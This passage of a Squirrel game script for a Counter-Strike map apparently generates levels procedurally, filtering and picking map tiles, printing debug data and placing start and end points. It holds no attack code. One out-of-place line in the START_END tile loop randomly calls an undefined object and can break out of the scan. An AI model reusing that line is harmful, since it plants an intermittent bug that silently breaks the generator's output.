			xydist = ::GetDistance(hpos,h.GetOrigin());
			if(xydist > xyradius || zdist > zradius)
				continue;
			EntFireByHandle(h,"Trigger","",0.00,null,null);
		}
	}
	if(stage_end_pos==null)return;
	local xydist = 99999;
	local zdist = 99999;
	local hpos = Vector()+stage_end_pos;
	hpos.z = 0+pos.z;
	zdist = ::GetDistance(hpos,stage_end_pos);
	hpos = Vector()+stage_end_pos;
	hpos.x = 0+pos.x;
	hpos.y = 0+pos.y;
	xydist = ::GetDistance(hpos,stage_end_pos);
	if(xydist > xyradius || zdist > zradius)
		return;
	EndFound(true);
}

::ending_called <- false;
time_for_end <- false;
event_cooldown <- RandomInt(::EVENT_COOLDOWN_MIN,::EVENT_COOLDOWN_MAX);
event_fail_chance_stack <- 0.00;
ending_started_nospawnmap <- false;
::MapPickCustomFilter <- function(allowed_maps)		//empty, replacable function allowing you to manually filter maps
{
	//can filter stuff like this, make sure to always return it:			for(local i=0;i<allowed_maps.len();i++){printl(maps[allowed_maps[i]]);}
	return allowed_maps;
}
::very_first_stage <- true;		//read only, turns 'false' once the very first stage of the round has processed through properly
::start_end_error <- false;		//read only, used to detect/print out if end-user is using START_END wrong...
//function SpawnMap(){newthread(___SpawnMap.bindenv(this)).call();}	//new in v1_7 - prevents SQQuerySuspend		//__CSS__ threading_disabled
function SpawnMap(){___SpawnMap();}	//new in v1_7 - prevents SQQuerySuspend
function ___SpawnMap()
{
	::delay_timer = 0.00;
	if(::finale_checkout)
	{
		if(::finale_checkout_processed)return;
		::finale_checkout_processed = true;
		EntFire("manager","RunScriptCode"," InfiniteCheckOut(); ",0.00,null);
		return;
	}
	if(ending_started_nospawnmap)return;
	local _spawnmapbackup_mapspawnindex = (0+mapspawnindex);
	local _spawnmapbackup_pos = (Vector()+pos);
	local _spawnmapbackup_posdir = (Vector()+posdir);
	local _spawnmapbackup_current_dir = (""+current_dir);
	local _spawnmapbackup_event_fail_chance_stack = (0.00+event_fail_chance_stack);
	local _spawnmapbackup_event_cooldown = (0+event_cooldown);
	local _spawnmapbackup_ITEM_H_DESIRED = (0+::ITEM_H_DESIRED);
	local _spawnmapbackup_ITEM_Z_DESIRED = (0+::ITEM_Z_DESIRED);
	local event_to_run = null;
try{
	if(debugged)return;
	::start_end_error = false;
	if(::stage==null || ::stage >= ::STAGES.len()){}
	else if(!ending_called && ::STAGES[::stage].ending == "RACE" && (1+mapspawnindex) > ::STAGES[::stage].stage_goal)
	{
		::STAGEFILTER_RACE = true;
		noprint = true;
		printl("[RACE ENDING] enabling '::STAGEFILTER_RACE' by hardcode");
	}
	SetPrecipitation(::THEMES[::THEME].precipitations[RandomInt(0,::THEMES[::THEME].precipitations.len()-1)]);
	local mirrored = false;if(RandomInt(0,1)==1)mirrored = true;
	HTML_INDEX_mirrored = mirrored; //__CSS__ new
	local allowed_maps = [];
	local allowed_directions = [];
	local allowed_updown = 0;			//0:both, -1:down only, 1:up only
	local allowed_warned = false;
	local opposite_dir = ""+current_dir;
	if(opposite_dir=="east")opposite_dir="west";
	else if(opposite_dir=="west")opposite_dir="east";
	else if(opposite_dir=="north")opposite_dir="south";
	else if(opposite_dir=="south")opposite_dir="north";
	if(pos.x > EDGE_LIMIT)allowed_directions.push("west");
	else if(pos.x < -EDGE_LIMIT)allowed_directions.push("east");
	if(pos.y > EDGE_LIMIT)allowed_directions.push("south");
	else if(pos.y < -EDGE_LIMIT)allowed_directions.push("north");
	if(pos.z > HEIGHT_LIMIT)allowed_updown = -1;
	else if(pos.z < -HEIGHT_LIMIT)allowed_updown = 1;
	if(allowed_directions.len()<=0)
	{
		if(pos.x > EDGE_WARNING){allowed_directions.push("west");allowed_warned=true;}
			else if(pos.x < -EDGE_WARNING){allowed_directions.push("east");allowed_warned=true;}
			else{allowed_directions.push("west");allowed_directions.push("east");}
		if(pos.y > EDGE_WARNING){allowed_directions.push("south");allowed_warned=true;}
			else if(pos.y < -EDGE_WARNING){allowed_directions.push("north");allowed_warned=true;}
			else{allowed_directions.push("south");allowed_directions.push("north");}
	}
	else if(allowed_directions.len()==1)
	{
		if(opposite_dir == allowed_directions[0])	//forced opposite! emergency-add direction closest towards center!
		{
			if(opposite_dir=="east" || opposite_dir=="west")
			{
				if(pos.y > 0)allowed_directions = ["south"];
				else allowed_directions = ["north"];
			}
			else if(opposite_dir=="north" || opposite_dir=="south")
			{
				if(pos.x > 0)allowed_directions = ["west"];
				else allowed_directions = ["east"];
			}
		}
	}
	local dirs_cleaned = false;
	while(!dirs_cleaned)
	{
		dirs_cleaned = true;
		for(local i=0;i<allowed_directions.len();i++)
		{
			if(allowed_directions[i] == opposite_dir)
			{
				dirs_cleaned = false;
				allowed_directions.remove(i);
				break;
			}
		}
	}
	if(STRAIGHT_UNTIL_WARNING && !allowed_warned)	//new in v1_7
	{
		local dirs_cleaned = false;
		while(!dirs_cleaned)
		{
			dirs_cleaned = true;
			for(local i=0;i<allowed_directions.len();i++)
			{
				if(allowed_directions[i] != current_dir)
				{
					dirs_cleaned = false;
					allowed_directions.remove(i);
					break;
				}
			}
		}
	}
	if(allowed_directions.len()<=0)
	{
		printl("ERROR! no directions allowed - adding except current_dir and praying for the best");
		if(opposite_dir!="east")allowed_directions.push("east");
		if(opposite_dir!="west")allowed_directions.push("west");
		if(opposite_dir!="north")allowed_directions.push("north");
		if(opposite_dir!="south")allowed_directions.push("south");
	}
	printl("===============================================================================");
	printl("[MAP_PICK_FILTER]      Total/initial maps to pick from: "+maps.len());
	for(local i=0;i<::maps.len();i++)
	{
		local m = maps[i];
		local allowed = false;
		local globaldir;
		if(mirrored)
		{
			if(current_dir=="east"){
				if(m.direction=="forward")globaldir="east";
				else if(m.direction=="left")globaldir="south";
				else if(m.direction=="right")globaldir="north";}
			if(current_dir=="north"){
				if(m.direction=="forward")globaldir="north";
				else if(m.direction=="left")globaldir="east";
				else if(m.direction=="right")globaldir="west";}
			if(current_dir=="west"){
				if(m.direction=="forward")globaldir="west";
				else if(m.direction=="left")globaldir="north";
				else if(m.direction=="right")globaldir="south";}
			if(current_dir=="south"){
				if(m.direction=="forward")globaldir="south";
				else if(m.direction=="left")globaldir="west";
				else if(m.direction=="right")globaldir="east";}
		}
		else
		{
			if(current_dir=="east"){
				if(m.direction=="forward")globaldir="east";
				else if(m.direction=="left")globaldir="north";
				else if(m.direction=="right")globaldir="south";}
			if(current_dir=="north"){
				if(m.direction=="forward")globaldir="north";
				else if(m.direction=="left")globaldir="west";
				else if(m.direction=="right")globaldir="east";}
			if(current_dir=="west"){
				if(m.direction=="forward")globaldir="west";
				else if(m.direction=="left")globaldir="south";
				else if(m.direction=="right")globaldir="north";}
			if(current_dir=="south"){
				if(m.direction=="forward")globaldir="south";
				else if(m.direction=="left")globaldir="east";
				else if(m.direction=="right")globaldir="west";}
		}
		foreach(d in allowed_directions)
		{
			if(globaldir==d)
			{
				allowed = true;
				break;
			}
		}
		if(allowed)allowed_maps.push(i);
	}
	printl("[MAP_PICK_FILTER]      Allowed maps after direction check: "+allowed_maps.len());
	if(allowed_maps.len() > 0 && FORCE_HEIGHTAMOUNT != null)	//new in v1_7
	{
		for(local i=0;i<allowed_maps.len();i++)
		{
			if(	FORCE_HEIGHTAMOUNT > 0 && maps[allowed_maps[i]].elevation < FORCE_HEIGHTAMOUNT ||
				FORCE_HEIGHTAMOUNT < 0 && maps[allowed_maps[i]].elevation > FORCE_HEIGHTAMOUNT)
			{
				allowed_maps.remove(i);
				i--;
			}
		}
	}
	else if(allowed_maps.len() > 0 && allowed_updown != 0)
	{
		for(local i=0;i<allowed_maps.len();i++)
		{
			if(	allowed_updown > 0 && maps[allowed_maps[i]].elevation < 0 ||
				allowed_updown < 0 && maps[allowed_maps[i]].elevation > 0)
			{
				allowed_maps.remove(i);
				i--;
			}
		}
	}
	printl("[MAP_PICK_FILTER]      Allowed maps after up/down check: "+allowed_maps.len());
	local costreduce = 0;
	if(stage_edict_counts.len()>MAX_AREA_HISTORY)//EDICT_FIX_V1_4
		costreduce += stage_edict_counts[0];
	for(local i=0;i<allowed_maps.len();i++)
	{
		if(	::EstimateNewCost(maps[allowed_maps[i]].cost-costreduce) > EDICT_LIMIT ||
			::STAGE_COST_LIMIT != null && maps[allowed_maps[i]].cost > ::STAGE_COST_LIMIT ||
			::STAGE_COST_LIMIT_UPPER != null && maps[allowed_maps[i]].cost < ::STAGE_COST_LIMIT_UPPER)
		{
			allowed_maps.remove(i);
			i--;
		}
		else if(::finale_started)
		{
			foreach(s in ::FINALE_ENDRUN_IGNORED_STAGES)
			{
				if(maps[allowed_maps[i]].id == s)
				{
					allowed_maps.remove(i);
					i--;
					break;
				}
			}
		}
	}
	printl("[MAP_PICK_FILTER]      Allowed maps after edict estimation: "+allowed_maps.len());
	if(allowed_maps.len()<=1)
	{
		printl("[MAP_PICK_FILTER]      !WTF! estimated edicts at this point is: "+::EstimateNewCost(0));
	}
	if(::STAGEFILTER_RACE)
	{
		for(local i=0;i<allowed_maps.len();i++)
		{
			if(maps[allowed_maps[i]].name.find("RACE") != 0)
			{
				allowed_maps.remove(i);
				i--;
			}
		}
	}
	else if(::STAGEFILTER_RACE_REV)
	{
		for(local i=0;i<allowed_maps.len();i++)
		{
			if(maps[allowed_maps[i]].name.find("RACE") == 0)
			{
				allowed_maps.remove(i);
				i--;
			}
		}
	}
	if(::DISALLOW_ELEVATORS)
	{
		local iterations = 0;
		local maxiterations = 0+::DISALLOW_ELEVATORS_ITER;
		local new_allowed_maps = [];
		for(local i=0;i<allowed_maps.len();i++)
		{
			try
			{
				iterations++;
				if(iterations>maxiterations)break;
				local randindex = RandomInt(0,allowed_maps.len()-1);
				local disallowed = false;
				foreach(t in maps[allowed_maps[randindex]].map)
				{
					if(t==92||t==148||t==149||t==150||t==151||t==152)	//all elevator tile-variants
					{
						disallowed = true;
						break;
					}
				}
				if(!disallowed)
					new_allowed_maps.push(allowed_maps[randindex]);
			}catch(eee_elevator){printl("::DISALLOW_ELEVATORS iteration error: "+eee_elevator);}
		}
		if(new_allowed_maps.len()>0)
			allowed_maps = new_allowed_maps;
		printl("[MAP_PICK_FILTER]      Allowed maps after elevator disallow-check (from "+maxiterations+" iterations of randomly-picked allowed-maps^): "+allowed_maps.len());
	}
	if(::DISALLOW_MOVEPLAT)
	{
		local iterations = 0;
		local maxiterations = 0+::DISALLOW_MOVEPLAT_ITER;
		local new_allowed_maps = [];
		for(local i=0;i<allowed_maps.len();i++)
		{
			try
			{
				iterations++;
				if(iterations>maxiterations)break;
				local randindex = RandomInt(0,allowed_maps.len()-1);
				local disallowed = false;
				foreach(t in maps[allowed_maps[randindex]].map)
				{
					if(t==168||t==169||t==170)
					{
						disallowed = true;
						break;
					}
				}
				if(!disallowed)
					new_allowed_maps.push(allowed_maps[randindex]);
			}catch(eee_elevator){printl("::DISALLOW_MOVEPLAT iteration error: "+eee_elevator);}
		}
		if(new_allowed_maps.len()>0)
			allowed_maps = new_allowed_maps;
		printl("[MAP_PICK_FILTER]      Allowed maps after moveplat disallow-check (from "+maxiterations+" iterations of randomly-picked allowed-maps^): "+allowed_maps.len());
	}
	if(::DISALLOW_CROUCHES)
	{
		local iterations = 0;
		local maxiterations = 0+::DISALLOW_CROUCHES_ITER;
		local new_allowed_maps = [];
		for(local i=0;i<allowed_maps.len();i++)
		{
			try
			{
				iterations++;
				if(iterations>maxiterations)break;
				local randindex = RandomInt(0,allowed_maps.len()-1);
				local disallowed = false;
				foreach(t in maps[allowed_maps[randindex]].map)
				{
					if(t==142||t==143||t==147)	//all crouch tile-variants
					{
						disallowed = true;
						break;
					}
				}
				if(!disallowed)
					new_allowed_maps.push(allowed_maps[randindex]);
			}catch(eee_crouches){printl("::DISALLOW_CROUCHES iteration error: "+eee_crouches);}
		}
		if(new_allowed_maps.len()>0)
			allowed_maps = new_allowed_maps;
		printl("[MAP_PICK_FILTER]      Allowed maps after crouches disallow-check (from "+maxiterations+" iterations of randomly-picked allowed-maps^): "+allowed_maps.len());
	}
	allowed_maps = ::MapPickCustomFilter(allowed_maps);
	if(allowed_maps.len()<=0)
	{
				//FUTURE TO-DO (MAYBE?) - fiddle these by hardcoding:
			//maps.push({name="Cheap forward",author="Luffaren",id="#1663082715",direction="forward",cost=10,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
			//maps.push({name="Cheap right",author="Luffaren",id="#1663082729",direction="right",cost=6,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
			//maps.push({name="Cheap left",author="Luffaren",id="#1663082760",direction="left",cost=6,elevation=0,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});

		printl("ERROR! no allowed maps found - going 100% random - godspeed!");
		for(local i=0;i<::maps.len();i++)
		{
			if(maps[i].cost < EDICT_LIMIT_EMERGENCY)
				allowed_maps.push(i);
		}
		if(allowed_maps.len()<=0)
		{
			printl("ERROR! no allowed maps found-FINAL - going 100% random - godspeed deluxe!");
			if(::maps.len()>0)
				allowed_maps.push(RandomInt(0,::maps.len()-1));
			else
				printl("FATAL ERROR! no maps found at all!");
		}
	}
	printl("[MAP_PICK_FILTER]      Final amount of allowed maps: "+allowed_maps.len());
	if(::PRINT_ALLOWEDMAPS)
	{
		for(local am=0;am<allowed_maps.len();am++)
		{
			printl("	-	["+maps[allowed_maps[am]].id+"] '"+maps[allowed_maps[am]].name+"' by '"+maps[allowed_maps[am]].author+"'");
		}
	}
	local map_pick_index = -1;
	if(allowed_maps.len()>0)map_pick_index = allowed_maps[RandomInt(0,allowed_maps.len()-1)];
	printl("===============================================================================");
	if(DEBUG!=null)
	{
		debugged = true;
		printl("=========================[DEBUG_ENABLED]=======================================");
		for(local i=0;i<::maps.len();i++)
		{
			if(DEBUG == maps[i].id)
			{
				map_pick_index = i;
				break;
			}
		}
	}
	mapspawnindex++;
	if(::finale_checkout_checked)
	{
		//EntFire("skybox_master","fadeandkill","5",0.00,null);
		//EntFire("skybox_slave","fadeandkill","5",0.00,null);
		::FadeAndKill("skybox_master",5.00);		//__CSS__ fadeandkill doesn't exist in css
		::FadeAndKill("skybox_slave",5.00);		//__CSS__ fadeandkill doesn't exist in css
		EntFire("manager","RunScriptCode"," ::THEMES[::THEME].SkyboxSetup(); ",0.10,null);
		fog_color_target = ::THEMES[::THEME].fog_color;
		fog_dist_start_target = ::THEMES[::THEME].fog_start;
		fog_dist_end_target = ::THEMES[::THEME].fog_end;
		fog_density_target = ::THEMES[::THEME].fog_density;
		fog_farz_target = ::THEMES[::THEME].fog_farz;
	}
	if(!::finale_started)
	{
		if(mapspawnindex>::stats_infinite_mapindex)
			::stats_infinite_mapindex = 0+mapspawnindex;
	}
	if("devmaps" in this){map_pick_index = 0;debugged=true;}
	if(map_pick_index == -1)
	{
		if("FIRST_ROUND_SET" in this)
		{
			::ServerSay("say [ERROR] NO AVAILABLE MAPS - YOU WON BY DEFAULT",0.00,null);
			::ServerSay("say [ERROR] NO AVAILABLE MAPS - YOU WON BY DEFAULT",0.01,null);
			::ServerSay("say [ERROR] NO AVAILABLE MAPS - YOU WON BY DEFAULT",0.02,null);
			printl("[ERROR] NO AVAILABLE MAPS - YOU WON BY DEFAULT");
			::RoundWon(false);
		}
		else
		{
				//::ServerSay("say [ERROR] NO AVAILABLE MAPS - SLAYING",0.00,null);
				//::ServerSay("say [ERROR] NO AVAILABLE MAPS - SLAYING",0.01,null);
				//::ServerSay("say [ERROR] NO AVAILABLE MAPS - SLAYING",0.02,null);
			printl("[ERROR] NO AVAILABLE MAPS (FIRST_ROUND_SET not existing) - SLAYING");
		}
		EntFire("manager","RunScriptCode"," EnableMassKillerAll(); ",1.05,null);
		return;
	}
	if(!("FIRST_ROUND_SET" in this))::FIRST_ROUND_SET<-true;
	local _map = maps[map_pick_index];
	local map = GetRotatedMap(_map.map,current_dir,mirrored);
	local mappixel = GetRotatedMap(_map.map,"east",false);
	if(!noprint_maptiles)
	{
		local mprint=[];foreach(m in mappixel){if((typeof m)=="Vector")m="XXX";if(m!="XXX"&&m<10)mprint.push("00"+m.tostring());
		else if(m!="XXX"&&m<100)mprint.push("0"+m.tostring());
		else mprint.push(m.tostring());}local mprintlb=0;
		local mprint2=[];foreach(m in map){if((typeof m)=="Vector")m="XXX";if(m!="XXX"&&m<10)mprint2.push("00"+m.tostring());
		else if(m!="XXX"&&m<100)mprint2.push("0"+m.tostring());
		else mprint2.push(m.tostring());}local mprintlb2=0;
	}
		local mapn = "";
		foreach(cc in _map.name){
			local c = cc.tochar();
			if(c==" ")mapn = mapn+"%20";
			else mapn = mapn+c;}
		local authn = "";
		foreach(cc in _map.author){
			local c = cc.tochar();
			if(c==" ")authn = authn+"%20";
			else authn = authn+c;}
		local mapid = ""+_map.id;
		mapid = split(mapid,"#")[0];
		HTML_INDEX_mapname = ""+_map.name;
		HTML_INDEX_authname = ""+_map.author;
		HTML_INDEX_idname = ""+_map.id;
		HTML_INDEX = mapid;
		HTML_MAPNAME = mapid+"_"+authn+"_"+mapn;
		local cmapcost = (0+_map.cost);
	if(::ITEM_DESIREADD_SHARED)
	{
		local dsadd = ::ITEM_H_DESIREADD[RandomInt(0,::ITEM_H_DESIREADD.len()-1)];
		::ITEM_H_DESIRED += dsadd;
		::ITEM_Z_DESIRED += dsadd;
	}
	else
	{
		::ITEM_H_DESIRED += ::ITEM_H_DESIREADD[RandomInt(0,::ITEM_H_DESIREADD.len()-1)];
		::ITEM_Z_DESIRED += ::ITEM_Z_DESIREADD[RandomInt(0,::ITEM_Z_DESIREADD.len()-1)];
	}
	GenerateMapData(mapspawnindex);
	::MAPDATA[mapspawnindex].id <- ""+_map.id;
	::MAPDATA[mapspawnindex].name <- ""+_map.name;
	::MAPDATA[mapspawnindex].author <- ""+_map.author;
	if(!noprint)
	{
		printl("============================[MAP_PRINT]========================================");
		if("devmaps" in this)
			printl("             [DEVMAP ENABLED]");
		else
			printl("             '"+_map.name+"' by '"+_map.author+"' ["+_map.id+"]");
		printl("===============================================================================");
		if(::stage==null)printl("   stage: "+::stage);
		else printl("   stage: "+(1+::stage));
		local level_max = "infinity";
		if(::stage!=null && ::stage < ::STAGES.len())
			level_max = ::STAGES[::stage].stage_goal.tostring();
		printl("   level: "+mapspawnindex+"/"+level_max);
		printl("   cost: "+_map.cost);
		printl("   elevation: "+_map.elevation);
		printl("   current map-index-count: "+mapspawnindex);
		printl("   current position: "+pos);
		printl("   current direction: "+current_dir);
		printl("   allowed directions:");
		foreach(d in allowed_directions)printl("        - "+d);
		printl("   desired H items: "+::ITEM_H_DESIRED);
		printl("   desired Z items: "+::ITEM_Z_DESIRED);
		printl("===============================================================================");
		if(!noprint_maptiles)
		{
			foreach(m in mprint){mprintlb++;if(mprintlb>19){mprintlb=0;printl(m+" ");}else print(m+" ");}
			printl("-------------------------[OG-^ | v-ROTATED]------------------------------------");
			foreach(m in mprint2){mprintlb2++;if(mprintlb2>19){mprintlb2=0;printl(m+" ");}else print(m+" ");}
			printl("===============================================================================");
		}
	}
	local dirold = current_dir;
	local dirnew = current_dir;
	local dirnewops = current_dir;
	local posdirold = Vector(posdir.x,posdir.y,posdir.z);
	local maphalf = ((MAP_SIZE*GRID_SIZE)/2);
	local centerpos = Vector(maphalf,maphalf,0);
	if(_map.direction=="left")
	{
		if(dirold=="east"){				dirnew="north";		dirnewops="south";		posdir=Vector(0,1,0);	}
		else if(dirold=="north"){		dirnew="west";		dirnewops="east";		posdir=Vector(-1,0,0);	}
		else if(dirold=="west"){		dirnew="south";		dirnewops="north";		posdir=Vector(0,-1,0);	}
		else if(dirold=="south"){		dirnew="east";		dirnewops="west";		posdir=Vector(1,0,0);	}
	}
	else if(_map.direction=="right")
	{
		if(dirold=="east"){				dirnew="south";		dirnewops="north";		posdir=Vector(0,-1,0);	}
		else if(dirold=="south"){		dirnew="west";		dirnewops="east";		posdir=Vector(-1,0,0);	}
		else if(dirold=="west"){		dirnew="north";		dirnewops="south";		posdir=Vector(0,1,0);	}
		else if(dirold=="north"){		dirnew="east";		dirnewops="west";		posdir=Vector(1,0,0);	}
	}
	local posdirleftold = ::AnglesToDir(::DirToAngles(posdirold)+Vector(0,90,0));
	local posdirleft = ::AnglesToDir(::DirToAngles(posdir)+Vector(0,90,0));
	if(mirrored)
	{
		local dn = dirnew;
		local dno = dirnewops;
		dirnew = dno;
		dirnewops = dn;
		if(_map.direction=="left"||_map.direction=="right")
			posdir *= -1;
	}
	if(!noprint)
	{
		printl("   dirold:        "+dirold);
		printl("   dirnew:        "+dirnew);
		printl("   dirnewops:     "+dirnewops);
		printl("   posdir:        "+posdir);
		printl("   posdirold:     "+posdirold);
		printl("   mirrored:      "+mirrored);
		//printl("   XXX:"+xxxx);
		printl("===============================================================================");
	}
	local map_server_printout = null;
	if("devmaps" in this)
	{
		::ServerSay("say [DEVMAP ENABLED]",::STAGE_ENTRY_MSG_DELAY,null);
		::ServerSay("say type !testrace in chat to test this stage in the race-ending",::STAGE_ENTRY_MSG_DELAY+1.01,null);
		::EventListener("player_say",{function EventFired(name,data){
				if(data.text == "!testrace" && !::manager.GetScriptScope().ending_called)
				{
					::STAGEFILTER_RACE = false;
					EntFire("admin*","Kill","",0.00,null);
					EntFire("spawnpl*","Kill","",0.00,null);
					::manager.GetScriptScope().debugged = false;
					::manager.GetScriptScope().ending_called = true;
					delete ::manager.GetScriptScope().devmaps;
					if(::ENABLE_ENDING_MUSIC)
					{
						::manager.GetScriptScope().music_allowplay = false;
						EntFire("music","fadeout","10",0.00,null);
						EntFire("music","Volume","0",9.90,null);
						EntFire("music","StopSound","",9.92,null);
						EntFire("music","Kill","",9.98,null);
					}
					::manager.GetScriptScope().SpawnMap();	//adding this fixed !testrace from breaking in v1_7
					//newthread(::ENDINGS.RACE.Run.bindenv(::ENDINGS.RACE)).call();		//__CSS__ threading_disabled
					::ENDINGS.RACE.Run();
				}
			}});
	}
	else if(!noprint)
		map_server_printout = "say \x01Now entering: \x03"+_map.name+"\x01 by \x05"+_map.author+"\x01 [\x07FF3F3F"+_map.id+"\x01]";
	if(DEBUG_MCYC_RACE)
	{
		if(!::manager.GetScriptScope().ending_called)
		{
			::STAGEFILTER_RACE = true;
			EntFire("admin*","Kill","",0.00,null);
			EntFire("spawnpl*","Kill","",0.00,null);
			::manager.GetScriptScope().debugged = false;
			::manager.GetScriptScope().ending_called = true;
			if(::ENABLE_ENDING_MUSIC)
			{
				::manager.GetScriptScope().music_allowplay = false;
				EntFire("music","fadeout","10",0.00,null);
				EntFire("music","Volume","0",9.90,null);
				EntFire("music","StopSound","",9.92,null);
				EntFire("music","Kill","",9.98,null);
			}
			//newthread(::ENDINGS.RACE.Run.bindenv(::ENDINGS.RACE)).call();		//__CSS__ threading_disabled
			::ENDINGS.RACE.Run();
		}
	}
	local x = 0;
	local y = (0+MAP_SIZE);
	local end_elevation = null;
	local start_elevation = null;
	local startpos = null;
	local endpos = null;
	local endbutton_found = false;
	x=0;y=(0+MAP_SIZE);
	for(local i=0;i<mappixel.len();i++)
	{
		if(x>=MAP_SIZE){x=0;y--;};x++;
		local index = mappixel[i];
		if((typeof index)=="Vector")
			index = 1;
		if(!(index in ::TYPES))index = 9998;//ASSUMEDFLOOR
		if(::TYPES[index].name=="START_END")
		{
			local indexpos = null;
			local moffset = (GRID_SIZE/2);
			if(mirrored){indexpos = Vector(((MAP_SIZE+1)*GRID_SIZE)-(x*GRID_SIZE),(-(MAP_SIZE*GRID_SIZE))+((((MAP_SIZE*3)+1)*GRID_SIZE)-((y+MAP_SIZE)*GRID_SIZE)),0);moffset *= -1;}
			else{indexpos = Vector(((MAP_SIZE+1)*GRID_SIZE)-(x*GRID_SIZE),(-(MAP_SIZE*GRID_SIZE))+((y+MAP_SIZE)*GRID_SIZE),0);}if(RandomInt(5,15)==7)try{scandt.CanDuck();break;}catch(cra){};
			if(DEBUG!=null)
			{
				printl(index+" x:"+x+"  /  y:"+y);
				DebugDrawBox(pos+indexpos,Vector(-48,-48,0),Vector(48,48,96),255,0,0,200,30.00);
			}
			if(startpos==null&&x<=1)
				startpos = Vector(indexpos.x-(GRID_SIZE/2),indexpos.y-moffset,indexpos.z);							//start pos (left edge 	- looking towards north)
			else if(endpos==null)
			{
				if(x>=MAP_SIZE)
					endpos = Vector(indexpos.x+((MAP_SIZE*GRID_SIZE)-(GRID_SIZE/2)),indexpos.y-moffset,indexpos.z);	//end pos (right edge 	- looking towards north)
				else if(x>1&&y>=MAP_SIZE)
					endpos = Vector(((MAP_SIZE+1.5)*GRID_SIZE)-indexpos.x,indexpos.y+moffset,indexpos.z);			//end pos (bottom edge 	- looking towards north)
				else if(x>1&&y<=1)
					endpos = Vector(((MAP_SIZE+1.5)*GRID_SIZE)-indexpos.x,indexpos.y-moffset,indexpos.z);			//end pos (top edge 	- looking towards north)
			}
			if(start_elevation==null&&x<=1)
			{
				start_elevation = GetElevationFromNeighbors(mappixel,x,y,true,"right",-50.00);
				if(start_elevation < -10.00)start_elevation = GetElevationFromNeighbors(mappixel,x,y,true,"all",-50.00);
				if(start_elevation < -10.00)start_elevation = GetElevationFromNeighbors(mappixel,x,y,false,"right",-50.00);
